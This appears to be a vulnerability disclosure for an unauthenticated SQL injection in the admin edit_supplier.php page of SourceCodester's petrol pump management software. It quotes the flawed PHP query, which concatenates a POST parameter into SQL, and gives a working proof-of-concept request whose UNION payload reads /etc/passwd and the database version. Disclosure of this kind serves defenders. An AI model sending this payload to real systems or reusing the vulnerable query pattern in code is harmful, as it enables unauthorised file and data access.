# SOURCECODESTER / Petrol pump management software - edit_supplier.php Unauthenticated SQL Injection

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>
> Russel James Avenido (https://github.com/lucishtml/lucishtml)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

## Affected Component
> /admin/edit_supplier.php

## Code
```php
  $stmt = $conn->prepare("SELECT * FROM `supplier` WHERE id='" . $_POST['id'] . "' ");
                                    $stmt->execute();
                                    $record = $stmt->fetchAll();
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/edit_supplier.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

id=1'+UNION+SELECT+1,load_file('/etc/passwd'),3,4,version(),6,7--+-
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/9b8fd8bf-9f6c-4a4b-acb5-6f962ba5b6cb)
